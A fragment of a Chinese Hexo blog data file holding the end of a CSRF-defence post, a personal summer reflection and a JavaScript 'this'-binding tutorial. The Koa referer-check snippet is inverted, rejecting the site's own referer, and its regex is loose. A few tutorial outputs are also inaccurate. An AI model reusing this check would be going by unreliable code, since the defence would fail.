title=\"增加验证码，token\"></a>增加验证码，token</h4><p>由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带</p><h4 id=\"验证referer，禁止来自第三方的请求\"><a href=\"#验证referer，禁止来自第三方的请求\" class=\"headerlink\" title=\"验证referer，禁止来自第三方的请求\"></a>验证referer，禁止来自第三方的请求</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// koa</span><br><span class=\"line\">let referer = ctx.request.headers.referer</span><br><span class=\"line\">if (/^https?:\\/\\/example.com/.test(referer)) &#123;</span><br><span class=\"line\">  // error</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p>第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer</p><p>在判断第三方请求时，可使用正则表达式</p><h2 id=\"CSRF攻击防御总结\"><a href=\"#CSRF攻击防御总结\" class=\"headerlink\" title=\"CSRF攻击防御总结\"></a>CSRF攻击防御总结</h2><ul><li>CSRF攻击主要是恶意网站访问已经具有登录态的网站</li><li>通过携带A网站的Cookie，以用户身份进行业务操作</li><li>攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站</li><li>防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求</li></ul><h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>XSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。</p>"},{"title":"2017暑期留校有感","date":"2017-08-04T12:18:39.000Z","dir":"随笔","_content":"一年一度的暑期留校就这样结束了。\n去年忘记总结，今年一定要总结。\n\n##### 回顾这一个月。我问自己学到了什么。\n1、从最开始的javascript。重读了一遍，发现要学习的东西还有很多。比如对象以及数组。依然得深挖。重读javascript对我在工作中帮助很大，让我发现许许多多js的新用法，精用法。\n2、这个月我也开始学习了http，入门http开始明白什么是http，为什么要用http，认识了http，以及http的简单用法，以及其规范。明白了三次握手，以及四次挥手的意义。以及https的原理。（比如前几天的赛门铁克的证书问题）\n3、学习nodejs，mongodb，由于重读了javascript，我开始学习nodejs以及mongodb。开始接触了一个小的项目，有关于消费查询。虽然不是自己写的，却对项目目录，以及项目重构有了一定的看法。\n4、项目经验。回答了新生的几个入门项目以及大型项目云家园的开发。面对大型项目的前端开发，确实有许许多多的问题，比如项目的冗余，以及项目的优化。多人合作问题等等。发现了大型项目的协作困难，以及了解了其流程开发。\n\n##### 生活上的感谢信\n很感激因为我手术原因照顾我的朋友们。\n首先是显林，由于手术原因，一直很照顾我。给我占座，给我带东西，帮我修bug，教我很多东西。整个暑期留校都有他的协助，真的很感激……可惜的是因为太忙所以下学期大多是不能留校了。在机房就没有几个大三的人了。\n其次是谢总，在生活上，我住他的寝室，平时也给我带很多吃的，带我去健身房，对于这身膘，他可是功不可没……每天在寝室看他和小姐姐聊天真是很无奈\n然后是可芹，在我中暑的时候给我霍香正气水，虽然很难喝，很难入口，但是这份情谊，铭记于心。生活上带我玩游戏，两个人互黑，冒着女朋友吃醋的风险，和她聊天，也是没谁了。\n小黑，一个女装大佬的存在，小黑真的是在生活中很平易近人的。帮我调verynginx，以及服务器。这份情谊实在深沉。\n还有老田，老田真的很强，帮我装arch，十几分钟就能从一个什么都没有的系统出现一个带有界面的linux，是在强大。对于调试方面，简直是大佬的存在\n最后还有大家，大家的在暑期留校里面，都提升了很多，对大家都了解了很多，在能力上大家都有提升，在情感上大家都增进了情感，了解了更多彼此。很感激此次的暑期留校。能让我看到不一样的家园工作室！","source":"_posts/summer-2017-feeling.md","raw":"---\ntitle: 2017暑期留校有感\ndate: 2017-08-04 20:18:39\ntags: 随笔\ndir: 随笔\n---\n一年一度的暑期留校就这样结束了。\n去年忘记总结，今年一定要总结。\n\n##### 回顾这一个月。我问自己学到了什么。\n1、从最开始的javascript。重读了一遍，发现要学习的东西还有很多。比如对象以及数组。依然得深挖。重读javascript对我在工作中帮助很大，让我发现许许多多js的新用法，精用法。\n2、这个月我也开始学习了http，入门http开始明白什么是http，为什么要用http，认识了http，以及http的简单用法，以及其规范。明白了三次握手，以及四次挥手的意义。以及https的原理。（比如前几天的赛门铁克的证书问题）\n3、学习nodejs，mongodb，由于重读了javascript，我开始学习nodejs以及mongodb。开始接触了一个小的项目，有关于消费查询。虽然不是自己写的，却对项目目录，以及项目重构有了一定的看法。\n4、项目经验。回答了新生的几个入门项目以及大型项目云家园的开发。面对大型项目的前端开发，确实有许许多多的问题，比如项目的冗余，以及项目的优化。多人合作问题等等。发现了大型项目的协作困难，以及了解了其流程开发。\n\n##### 生活上的感谢信\n很感激因为我手术原因照顾我的朋友们。\n首先是显林，由于手术原因，一直很照顾我。给我占座，给我带东西，帮我修bug，教我很多东西。整个暑期留校都有他的协助，真的很感激……可惜的是因为太忙所以下学期大多是不能留校了。在机房就没有几个大三的人了。\n其次是谢总，在生活上，我住他的寝室，平时也给我带很多吃的，带我去健身房，对于这身膘，他可是功不可没……每天在寝室看他和小姐姐聊天真是很无奈\n然后是可芹，在我中暑的时候给我霍香正气水，虽然很难喝，很难入口，但是这份情谊，铭记于心。生活上带我玩游戏，两个人互黑，冒着女朋友吃醋的风险，和她聊天，也是没谁了。\n小黑，一个女装大佬的存在，小黑真的是在生活中很平易近人的。帮我调verynginx，以及服务器。这份情谊实在深沉。\n还有老田，老田真的很强，帮我装arch，十几分钟就能从一个什么都没有的系统出现一个带有界面的linux，是在强大。对于调试方面，简直是大佬的存在\n最后还有大家，大家的在暑期留校里面，都提升了很多，对大家都了解了很多，在能力上大家都有提升，在情感上大家都增进了情感，了解了更多彼此。很感激此次的暑期留校。能让我看到不一样的家园工作室！","slug":"summer-2017-feeling","published":1,"updated":"2021-09-11T05:00:54.893Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0b001o4jzxpbdew2wo","content":"<p>一年一度的暑期留校就这样结束了。<br>去年忘记总结，今年一定要总结。</p><h5 id=\"回顾这一个月。我问自己学到了什么。\"><a href=\"#回顾这一个月。我问自己学到了什么。\" class=\"headerlink\" title=\"回顾这一个月。我问自己学到了什么。\"></a>回顾这一个月。我问自己学到了什么。</h5><p>1、从最开始的javascript。重读了一遍，发现要学习的东西还有很多。比如对象以及数组。依然得深挖。重读javascript对我在工作中帮助很大，让我发现许许多多js的新用法，精用法。<br>2、这个月我也开始学习了http，入门http开始明白什么是http，为什么要用http，认识了http，以及http的简单用法，以及其规范。明白了三次握手，以及四次挥手的意义。以及https的原理。（比如前几天的赛门铁克的证书问题）<br>3、学习nodejs，mongodb，由于重读了javascript，我开始学习nodejs以及mongodb。开始接触了一个小的项目，有关于消费查询。虽然不是自己写的，却对项目目录，以及项目重构有了一定的看法。<br>4、项目经验。回答了新生的几个入门项目以及大型项目云家园的开发。面对大型项目的前端开发，确实有许许多多的问题，比如项目的冗余，以及项目的优化。多人合作问题等等。发现了大型项目的协作困难，以及了解了其流程开发。</p><h5 id=\"生活上的感谢信\"><a href=\"#生活上的感谢信\" class=\"headerlink\" title=\"生活上的感谢信\"></a>生活上的感谢信</h5><p>很感激因为我手术原因照顾我的朋友们。<br>首先是显林，由于手术原因，一直很照顾我。给我占座，给我带东西，帮我修bug，教我很多东西。整个暑期留校都有他的协助，真的很感激……可惜的是因为太忙所以下学期大多是不能留校了。在机房就没有几个大三的人了。<br>其次是谢总，在生活上，我住他的寝室，平时也给我带很多吃的，带我去健身房，对于这身膘，他可是功不可没……每天在寝室看他和小姐姐聊天真是很无奈<br>然后是可芹，在我中暑的时候给我霍香正气水，虽然很难喝，很难入口，但是这份情谊，铭记于心。生活上带我玩游戏，两个人互黑，冒着女朋友吃醋的风险，和她聊天，也是没谁了。<br>小黑，一个女装大佬的存在，小黑真的是在生活中很平易近人的。帮我调verynginx，以及服务器。这份情谊实在深沉。<br>还有老田，老田真的很强，帮我装arch，十几分钟就能从一个什么都没有的系统出现一个带有界面的linux，是在强大。对于调试方面，简直是大佬的存在<br>最后还有大家，大家的在暑期留校里面，都提升了很多，对大家都了解了很多，在能力上大家都有提升，在情感上大家都增进了情感，了解了更多彼此。很感激此次的暑期留校。能让我看到不一样的家园工作室！</p>","site":{"data":{}},"excerpt":"","more":"<p>一年一度的暑期留校就这样结束了。<br>去年忘记总结，今年一定要总结。</p><h5 id=\"回顾这一个月。我问自己学到了什么。\"><a href=\"#回顾这一个月。我问自己学到了什么。\" class=\"headerlink\" title=\"回顾这一个月。我问自己学到了什么。\"></a>回顾这一个月。我问自己学到了什么。</h5><p>1、从最开始的javascript。重读了一遍，发现要学习的东西还有很多。比如对象以及数组。依然得深挖。重读javascript对我在工作中帮助很大，让我发现许许多多js的新用法，精用法。<br>2、这个月我也开始学习了http，入门http开始明白什么是http，为什么要用http，认识了http，以及http的简单用法，以及其规范。明白了三次握手，以及四次挥手的意义。以及https的原理。（比如前几天的赛门铁克的证书问题）<br>3、学习nodejs，mongodb，由于重读了javascript，我开始学习nodejs以及mongodb。开始接触了一个小的项目，有关于消费查询。虽然不是自己写的，却对项目目录，以及项目重构有了一定的看法。<br>4、项目经验。回答了新生的几个入门项目以及大型项目云家园的开发。面对大型项目的前端开发，确实有许许多多的问题，比如项目的冗余，以及项目的优化。多人合作问题等等。发现了大型项目的协作困难，以及了解了其流程开发。</p><h5 id=\"生活上的感谢信\"><a href=\"#生活上的感谢信\" class=\"headerlink\" title=\"生活上的感谢信\"></a>生活上的感谢信</h5><p>很感激因为我手术原因照顾我的朋友们。<br>首先是显林，由于手术原因，一直很照顾我。给我占座，给我带东西，帮我修bug，教我很多东西。整个暑期留校都有他的协助，真的很感激……可惜的是因为太忙所以下学期大多是不能留校了。在机房就没有几个大三的人了。<br>其次是谢总，在生活上，我住他的寝室，平时也给我带很多吃的，带我去健身房，对于这身膘，他可是功不可没……每天在寝室看他和小姐姐聊天真是很无奈<br>然后是可芹，在我中暑的时候给我霍香正气水，虽然很难喝，很难入口，但是这份情谊，铭记于心。生活上带我玩游戏，两个人互黑，冒着女朋友吃醋的风险，和她聊天，也是没谁了。<br>小黑，一个女装大佬的存在，小黑真的是在生活中很平易近人的。帮我调verynginx，以及服务器。这份情谊实在深沉。<br>还有老田，老田真的很强，帮我装arch，十几分钟就能从一个什么都没有的系统出现一个带有界面的linux，是在强大。对于调试方面，简直是大佬的存在<br>最后还有大家，大家的在暑期留校里面，都提升了很多，对大家都了解了很多，在能力上大家都有提升，在情感上大家都增进了情感，了解了更多彼此。很感激此次的暑期留校。能让我看到不一样的家园工作室！</p>"},{"title":"你不知道的javascript————this和对象原型","date":"2017-09-06T12:29:15.000Z","dir":"javascript","keywords":"你不知道的javascript————this和对象原型","_content":"### this误解\n从字面意思来看,this貌似是指向自身的.因此出现各种各样的误解.\n\n##### 指向自身\n先看一个demo\n```\nfunction foo(num) {\n\tconsole.log(\"foo: \" + num);\n\tthis.count++;\n}\nfoo.count = 0;\nvar i;\nfor (i = 0; i < 10; i++) {\n\tif(i > 5) {\n\t\tfoo(i)\n\t}\n}\n// foo: 6\n// foo: 7\n// foo: 8\n// foo: 9\nconsole.log(this.count)\t// NaN\n```\n从上述例子中,可以很清楚的看到函数被调用了四次,而为什么打印出来的this.count是NaN呢?显然this指向的count并不是函数的count.的确在foo.count=0的时候给对象foo加了一个count,但是内部代码this.count却不是指向的那个函数对象.从第二章的理解当中,不难发现,其创建了一个全局count,并且它是NaN.\n\n### this是什么?\nthis是在运行时绑定的,并不是在编写时绑定的.他的上下文取决于函数调用时的各种条件,this绑定和函数声明没有任何关系,取决于函数的调用方式.\n\n当一个函数被调用时,会创建一个活动记录(有时候称之为上下文).这个记录会包含函数在哪里被调用(调用栈)、函数的调用方式、传入的参数信息,而this就是这个记录的一个属性。会在函数执行过程中用到。\n\n_PS:说白了，THIS实际上是在函数调用时发生的绑定，他指向什么完全取决于函数在哪里被调用。_\n\n##### 调用位置\n```\nfunction baz() {\n\t// 当前作用栈是： baz\n\t// 因此调用位置是全局作用域\n\tconsole.log(\"baz\")\n\tbar()\t\t\t// <-- bar的调用位置\n}\nfunction bar() {\n\t// 当前调用栈是baz -> bar\n\t// 因此调用位置是baz中\n\tconsole.log(\"bar\")\n\tfoo();\t\t// <-- foo的调用位置\n}\nfunction foo() {\n\t// 当前调用栈是baz -> bar -> foo\n\t// 当前调用位置在bar中\n\tconsole.log(\"foo\")\n}\nbaz()    // <-- baz的调用位置\n```\n从上述调用栈，可以分析出真正的调用位置，他决定了this的绑定\n### 四种绑定规则\n##### 默认绑定\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar a = 2;\nfoo();\t// 2\n///////////////////////\nfunction foo2() {\n\t\"use strict\"\n\tconsole.log(this.a)\n}\nvar a =2\nfoo2() \t\t// typeerror\n////////////////////////\nfunction foo3() {\n\tconsole.log(this.a)\n}\nvar a =2\n(function () {\n\t\"use strict\"\n\tfoo3()\t\t// 2\n})()\n\n```\n在非严格模式下，foo的调用默认指向调用位置，例子中是全局，而在严格模式下会抛出异常，在严格模式调用其他位置的this，也可以调用。\n\n##### 隐式绑定\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta : 2,\n\tfoo : foo\n}\nobj.foo \t// 2\n\n```\n在代码中，foo默认是绑定在obj的foo的属性上，因此隐式的把foo中的this绑定在obj之上，调用的也是obj中的a\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj2 = {\n\ta:42,\n\tfoo:foo\n}\nvar obj1 = {\n\ta: 2,\n\tobj2: obj2\n}\nobj1.obj2.foo() \t// 42\n\n```\n在上面的代码中，经过多层的调用，但是最终结果还是指向的是最后一层调用的位置。因此可以的出结论。在对象属性引用链中只有上一层或者说最后一层在调用位置中起作用。\n##### 隐式丢失\n```\n// 隐式丢失，成为默认绑定\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta:2,\n\tfoo: foo\n}\nvar bar = obj.foo\nvar a = \"this is global\"\nbar()\t\t\t// this is global\n////////////////////////////////////////\n// 回调的隐式丢失\nfunction foo() {\n\tconsole.log(this.a)\n}\nfunction doFoo(fn) {\n\t// fn其实引用的是foo\n\tfn()\t\t// 调用位置\n}\nvar obj = {\n\ta: 2,\n\tfoo: foo\n}\nvar a = \"this is global\"\ndoFoo(obj.foo)\t// this is global\n\n```\n虽然bar是obj.foo的一个引用，但实际上，它引用的是foo函数本身，因此此时的bar()其实是一个不带任何修饰的函数调用，因此引用了默认绑定。\n第二种情况也是如此，在回调时的隐式丢失导致的问题\n这也导致setTimeout中的隐式丢失，常用方法是将this绑定到一个变量中，这样就不会导致隐式丢失\n\n##### 显式绑定\n使用call，和apply方法绑定。\n**1、硬绑定**\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta:2\n}\nvar bar = function () {\n\tfoo.call(obj)\n}\nbar()\t\t// 2\nsetTimeout(bar, 100)\t// 2\nbar.call(window)\t// 2\n\n```\n无论是强制显示调用window，他都是2.因为在bar这个函数中调用了foo.call(obj)，最终都会绑定到obj上。为了硬绑定的应用，ES5中有bind方法，专门用于绑定。\n\n**API调用的“上下文”**\n和bind一样，他的作用是保证回调\n```\nfunction foo(el) {\n\tconsole.log(el, this.id)\n}\nvar obj = {\n\tid: \"awesome\"\n}\n[1, 2, 3].forEach(foo, obj) \t// 调用时将this绑定到obj上\n```\n**new 绑定**\n使用new来调用函数，会自动执行以下操作：\n1、创建一个全新的对象\n2、这个新对象会被执行[[Prototype]]连接\n3、这个新对象会绑定到函数调用的this\n4、如果函数没有返回其他对象，那么new表达式中的函数中会自动调用这个对象\n```\nfunction foo(a){\n\tthis.a = a\n}\nvar bar = new foo(2)\nconsole.log(bar.a)\t\t// 2\n``` \n_ps：优先级------>new绑定>显示绑定>隐式绑定>默认绑定_\n### 判断this\n1、函数是否在new中调用(new绑定)？如果是的话this绑定是新的对象\n2、函数是否通过call、apply(显示绑定)或者硬绑定的调用？如果是的话this绑定的是制定对象\n3、函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this绑定到那个上下文对象中\n4、如果都不是的话，使用默认绑定，在严格模式下，就绑定到undefined上，否则绑定到全局对象上。\n##### 例外\n```bash\nfunction foo(){\n\tconsole.log(this.a)\n}\nvar a = 2\nfoo.call(null)\t// 默认绑定\n///////////////////////////////////\n// 科里化\nfunction foo(a, b) {\n\tconsole.log(\"a:\" + a +\" , b: \" + b)\n}\nfoo.apply(null, [2,3])\t// a:2,b:3\nvar bar = foo.bind(null, 2)\nbar(3)\n///////////////////////////////////\n// 间接引用\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar a = 2\nvar o = {a:3, foo: foo}\nvar p = {a:4}\no.foo() \t// 3\n(p.foo = o.foo)() \t// 2\n// 复制表达式p.foo = o.foo的返回值是目标函数的引用，因此调用位置是foo()而不是p.foo或者o.foo\n```\n### 对象\n在string中，本身的字符串“I am a string”并不是一个对象，而是一个字面量，在使用了对象的方法之后，javascript会自动将其转换成一个string对象\nnull和undefined没有对应的构造函数，他们只有文字形式。相反，Date只有构造函数，没有文字形式。\n对于Object，Array，Function和RegExp来说，无论是文字形式还是构造形式，他们都是对象不是字面量。","source":"_posts/you-dont-konwn-javascript-this.md","raw":"---\ntitle: 你不知道的javascript————this和对象原型\ndate: 2017-09-06 20:29:15\ntags: javascript\ndir: javascript\nkeywords: 你不知道的javascript————this和对象原型\n---\n### this误解\n从字面意思来看,this貌似是指向自身的.因此出现各种各样的误解.\n\n##### 指向自身\n先看一个demo\n```\nfunction foo(num) {\n\tconsole.log(\"foo: \" + num);\n\tthis.count++;\n}\nfoo.count = 0;\nvar i;\nfor (i = 0; i < 10; i++) {\n\tif(i > 5) {\n\t\tfoo(i)\n\t}\n}\n// foo: 6\n// foo: 7\n// foo: 8\n// foo: 9\nconsole.log(this.count)\t// NaN\n```\n从上述例子中,可以很清楚的看到函数被调用了四次,而为什么打印出来的this.count是NaN呢?显然this指向的count并不是函数的count.的确在foo.count=0的时候给对象foo加了一个count,但是内部代码this.count却不是指向的那个函数对象.从第二章的理解当中,不难发现,其创建了一个全局count,并且它是NaN.\n\n### this是什么?\nthis是在运行时绑定的,并不是在编写时绑定的.他的上下文取决于函数调用时的各种条件,this绑定和函数声明没有任何关系,取决于函数的调用方式.\n\n当一个函数被调用时,会创建一个活动记录(有时候称之为上下文).这个记录会包含函数在哪里被调用(调用栈)、函数的调用方式、传入的参数信息,而this就是这个记录的一个属性。会在函数执行过程中用到。\n\n_PS:说白了，THIS实际上是在函数调用时发生的绑定，他指向什么完全取决于函数在哪里被调用。_\n\n##### 调用位置\n```\nfunction baz() {\n\t// 当前作用栈是： baz\n\t// 因此调用位置是全局作用域\n\tconsole.log(\"baz\")\n\tbar()\t\t\t// <-- bar的调用位置\n}\nfunction bar() {\n\t// 当前调用栈是baz -> bar\n\t// 因此调用位置是baz中\n\tconsole.log(\"bar\")\n\tfoo();\t\t// <-- foo的调用位置\n}\nfunction foo() {\n\t// 当前调用栈是baz -> bar -> foo\n\t// 当前调用位置在bar中\n\tconsole.log(\"foo\")\n}\nbaz()    // <-- baz的调用位置\n```\n从上述调用栈，可以分析出真正的调用位置，他决定了this的绑定\n### 四种绑定规则\n##### 默认绑定\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar a = 2;\nfoo();\t// 2\n///////////////////////\nfunction foo2() {\n\t\"use strict\"\n\tconsole.log(this.a)\n}\nvar a =2\nfoo2() \t\t// typeerror\n////////////////////////\nfunction foo3() {\n\tconsole.log(this.a)\n}\nvar a =2\n(function () {\n\t\"use strict\"\n\tfoo3()\t\t// 2\n})()\n\n```\n在非严格模式下，foo的调用默认指向调用位置，例子中是全局，而在严格模式下会抛出异常，在严格模式调用其他位置的this，也可以调用。\n\n##### 隐式绑定\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta : 2,\n\tfoo : foo\n}\nobj.foo \t// 2\n\n```\n在代码中，foo默认是绑定在obj的foo的属性上，因此隐式的把foo中的this绑定在obj之上，调用的也是obj中的a\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj2 = {\n\ta:42,\n\tfoo:foo\n}\nvar obj1 = {\n\ta: 2,\n\tobj2: obj2\n}\nobj1.obj2.foo() \t// 42\n\n```\n在上面的代码中，经过多层的调用，但是最终结果还是指向的是最后一层调用的位置。因此可以的出结论。在对象属性引用链中只有上一层或者说最后一层在调用位置中起作用。\n##### 隐式丢失\n```\n// 隐式丢失，成为默认绑定\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta:2,\n\tfoo: foo\n}\nvar bar = obj.foo\nvar a = \"this is global\"\nbar()\t\t\t// this is global\n////////////////////////////////////////\n// 回调的隐式丢失\nfunction foo() {\n\tconsole.log(this.a)\n}\nfunction doFoo(fn) {\n\t// fn其实引用的是foo\n\tfn()\t\t// 调用位置\n}\nvar obj = {\n\ta: 2,\n\tfoo: foo\n}\nvar a = \"this is global\"\ndoFoo(obj.foo)\t// this is global\n\n```\n虽然bar是obj.foo的一个引用，但实际上，它引用的是foo函数本身，因此此时的bar()其实是一个不带任何修饰的函数调用，因此引用了默认绑定。\n第二种情况也是如此，在回调时的隐式丢失导致的问题\n这也导致setTimeout中的隐式丢失，常用方法是将this绑定到一个变量中，这样就不会导致隐式丢失\n\n##### 显式绑定\n使用call，和apply方法绑定。\n**1、硬绑定**\n```\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar obj = {\n\ta:2\n}\nvar bar = function () {\n\tfoo.call(obj)\n}\nbar()\t\t// 2\nsetTimeout(bar, 100)\t// 2\nbar.call(window)\t// 2\n\n```\n无论是强制显示调用window，他都是2.因为在bar这个函数中调用了foo.call(obj)，最终都会绑定到obj上。为了硬绑定的应用，ES5中有bind方法，专门用于绑定。\n\n**API调用的“上下文”**\n和bind一样，他的作用是保证回调\n```\nfunction foo(el) {\n\tconsole.log(el, this.id)\n}\nvar obj = {\n\tid: \"awesome\"\n}\n[1, 2, 3].forEach(foo, obj) \t// 调用时将this绑定到obj上\n```\n**new 绑定**\n使用new来调用函数，会自动执行以下操作：\n1、创建一个全新的对象\n2、这个新对象会被执行[[Prototype]]连接\n3、这个新对象会绑定到函数调用的this\n4、如果函数没有返回其他对象，那么new表达式中的函数中会自动调用这个对象\n```\nfunction foo(a){\n\tthis.a = a\n}\nvar bar = new foo(2)\nconsole.log(bar.a)\t\t// 2\n``` \n_ps：优先级------>new绑定>显示绑定>隐式绑定>默认绑定_\n### 判断this\n1、函数是否在new中调用(new绑定)？如果是的话this绑定是新的对象\n2、函数是否通过call、apply(显示绑定)或者硬绑定的调用？如果是的话this绑定的是制定对象\n3、函数是否在某个上下文对象中调用(隐式绑定)？如果是的话，this绑定到那个上下文对象中\n4、如果都不是的话，使用默认绑定，在严格模式下，就绑定到undefined上，否则绑定到全局对象上。\n##### 例外\n```bash\nfunction foo(){\n\tconsole.log(this.a)\n}\nvar a = 2\nfoo.call(null)\t// 默认绑定\n///////////////////////////////////\n// 科里化\nfunction foo(a, b) {\n\tconsole.log(\"a:\" + a +\" , b: \" + b)\n}\nfoo.apply(null, [2,3])\t// a:2,b:3\nvar bar = foo.bind(null, 2)\nbar(3)\n///////////////////////////////////\n// 间接引用\nfunction foo() {\n\tconsole.log(this.a)\n}\nvar a = 2\nvar o = {a:3, foo: foo}\nvar p = {a:4}\no.foo() \t// 3\n(p.foo = o.foo)() \t// 2\n// 复制表达式p.foo = o.foo的返回值是目标函数的引用，因此调用位置是foo()而不是p.foo或者o.foo\n```\n### 对象\n在string中，本身的字符串“I am a string”并不是一个对象，而是一个字面量，在使用了对象的方法之后，javascript会自动将其转换成一个string对象\nnull和undefined没有对应的构造函数，他们只有文字形式。相反，Date只有构造函数，没有文字形式。\n对于Object，Array，Function和RegExp来说，无论是文字形式还是构造形式，他们都是对象不是字面量。","slug":"you-dont-konwn-javascript-this","published":1,"updated":"2021-10-13T15:50:37.547Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0b001q4jzxen1rv2cr","content":"<h3 id=\"this误解\"><a href=\"#this误解\" class=\"headerlink\" title=\"this误解\"></a>this误解</h3><p>从字面意思来看,this貌似是指向自身的.因此出现各种各样的误解.</p><h5 id=\"指向自身\"><a href=\"#指向自身\" class=\"headerlink\" title=\"指向自身\"></a>指向自身</h5><p>先看一个demo<br></p><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(num) &#123;</span><br><span class=\"line\">\tconsole.log(&quot;foo: &quot; + num);</span><br><span class=\"line\">\tthis.count++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo.count = 0;</span><br><span class=\"line\">var i;</span><br><span class=\"line\">for (i = 0; i &lt; 10; i++) &#123;</span><br><span class=\"line\">\tif(i &gt; 5) &#123;</span><br><span class=\"line\">\t\tfoo(i)</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">// foo: 6</span><br><span class=\"line\">// foo: 7</span><br><span class=\"line\">// foo: 8</span><br><span class=\"line\">// foo: 9</span><br><span class=\"line\">console.log(this.count)\t// NaN</span><br></pre></td></tr></table></figure><p></p><p>从上述例子中,可以很清楚的看到函数被调用了四次,而为什么打印出来的this.count是NaN呢?显然this指向的count并不是函数的count.的确在foo.count=0的时候给对象foo加了一个count,但是内部代码this.count却不是指向的那个函数对象.从第二章的理解当中,不难发现,其创建了一个全局count,并且它是NaN.</p><h3 id=\"this是什么\"><a href=\"#this是什么\" class=\"headerlink\" title=\"this是什么?\"></a>this是什么?</h3><p>this是在运行时绑定的,并不是在编写时绑定的.他的上下文取决于函数调用时的各种条件,this绑定和函数声明没有任何关系,取决于函数的调用方式.</p><p>当一个函数被调用时,会创建一个活动记录(有时候称之为上下文).这个记录会包含函数在哪里被调用(调用栈)、函数的调用方式、传入的参数信息,而this就是这个记录的一个属性。会在函数执行过程中用到。</p><p><em>PS:说白了，THIS实际上是在函数调用时发生的绑定，他指向什么完全取决于函数在哪里被调用。</em></p><h5 id=\"调用位置\"><a href=\"#调用位置\" class=\"headerlink\" title=\"调用位置\"></a>调用位置</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function baz() &#123;</span><br><span class=\"line\">\t// 当前作用栈是： baz</span><br><span class=\"line\">\t// 因此调用位置是全局作用域</span><br><span class=\"line\">\tconsole.log(&quot;baz&quot;)</span><br><span class=\"line\">\tbar()\t\t\t// &lt;-- bar的调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function bar() &#123;</span><br><span class=\"line\">\t// 当前调用栈是baz -&gt; bar</span><br><span class=\"line\">\t// 因此调用位置是baz中</span><br><span class=\"line\">\tconsole.log(&quot;bar&quot;)</span><br><span class=\"line\">\tfoo();\t\t// &lt;-- foo的调用位置</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\t// 当前调用栈是baz -&gt; bar -&gt; foo</span><br><span class=\"line\">\t// 当前调用位置在bar中</span><br><span class=\"line\">\tconsole.log(&quot;foo&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">baz()    // &lt;-- baz的调用位置</span><br></pre></td></tr></table></figure><p>从上述调用栈，可以分析出真正的调用位置，他决定了this的绑定</p><h3 id=\"四种绑定规则\"><a href=\"#四种绑定规则\" class=\"headerlink\" title=\"四种绑定规则\"></a>四种绑定规则</h3><h5 id=\"默认绑定\"><a href=\"#默认绑定\" class=\"headerlink\" title=\"默认绑定\"></a>默认绑定</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo() &#123;</span><br><span class=\"line\">\tconsole.log(this.a)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var a = 2;</span><br><span class=\"line\">foo();\t// 2</span><br><span 